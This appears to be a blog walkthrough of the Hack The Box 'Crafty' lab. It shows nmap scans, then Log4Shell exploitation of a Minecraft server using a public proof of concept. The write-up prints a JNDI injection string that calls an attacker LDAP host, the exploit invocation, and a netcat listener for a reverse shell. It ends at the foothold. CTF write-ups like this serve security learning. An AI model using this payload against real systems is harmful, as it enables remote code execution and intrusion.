---
layout: post
section-type: post
has-comments: true
title: Hack The Box - Crafty
category: tech
tags: ["tutorial"]
---

### Reconnaissance and Initial Steps

#### Nmap Results

```
nmap 10.10.11.249 -p-
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/fbc9f2f4-73e7-4f98-9fb3-7856d3a97db9)

```
sudo nmap -p80,25565 -sV -sC 10.10.11.249
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/4a79d415-09b1-46a8-8d79-2dbb2f999681)


I add crafty to `/etc/hosts` with the corresponding ip address given. Then navigate to `http://crafty.htb`

```
echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
```

When I visited `crafty.htb`, I found a Minecraft introduction page.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/4c649f78-9e8e-42b2-ac1d-7b782e8d63c0)


### Foothold
However, for `port 25565`, I recall there being a log4j vulnerability, `CVE-2021–44228` to be precise. This exploit enables control over log messages and parameters to execute arbitrary code. An exploit for this vulnerability can be found here.

```
git clone https://github.com/kozmer/log4j-shell-poc
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/be2f0fed-4ad2-48b6-bbf9-ccd312818f72)


Modify the `String cmd` variable to ensure compatibility with Windows.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/0f5a7e2e-8431-4bb8-bdca-a37c2d19fcfd)

In order for `poc.py` to run smoothly we need a java archive to be named `jdk1.8.0_20`. I found a java archive here

```
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
tar -xf jdk-8u181-linux-x64.tar.gz
mv jdk1.8.0_181 jdk1.8.0_20
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/ea8c6034-046d-4403-be85-10b8293e35c4)

To connect to the server, I needed to download the Minecraft client on my Kali system. After conducting some research, I downloaded TLauncher. https://tlauncher.org/en/download_1/minecraft-1-16-5_12582.html (I don't recommend using this, but I proceeded anyway since I'm installing it on a VM.) 
And I used Minecraft 1.16.5 Java Edition as I knew it's vulnerable to log4j.

one download the TLauncher.zip file, unzip it and open it by runing below command:


```
sudo java -jar TLauncher.jar
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/468caa45-5db4-42da-88ae-68c589cff9ef)


![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/a5013fe2-04a9-4294-a7e9-4e607b6e33a7)

after that select the correct release version and fill the minecraft account name, then procced on `Enter the game`.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/edee156a-e103-44f7-8053-bff066a85aef)

Clicking on `Multiplayer` allowed me to enter the server.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/b0c99b16-e72e-4528-9c4e-f2236aee7da5)

```
10.10.11.249:25565
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/f5e39e36-ac3c-4c1f-ba00-cf4a648214b3)

I had to attempt logging in to the server multiple times, and each time I had to reset the box for it to function properly. Once I login to the server, I opened a terminal and ran the POC. and it will show a command (`${jndi:ldap://10.10.16.18:1389/a}`) I copied that.

```
python3 poc.py --userip <tun0 IP> --webport 80 --lport 4444
```

and open another terminal and create a netcat listener on port 4444

```
nc -nlvp 4444
```

then in minecraft, I press `t` (to send a message) and in the chat box i paste that copied command (`${jndi:ldap://10.10.16.18:1389/a}`), so in few second i got the reverse shell in my netcat listener.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/3ffc0caf-9e4a-4e8a-9a97-b623affeb991)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/1a10e978-4a64-48d8-9990-c9d7ed14e5a7)

in below screenshot you can see whole process:

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/23388288-8ca3-4e85-bee1-e9a89d1c93c9)










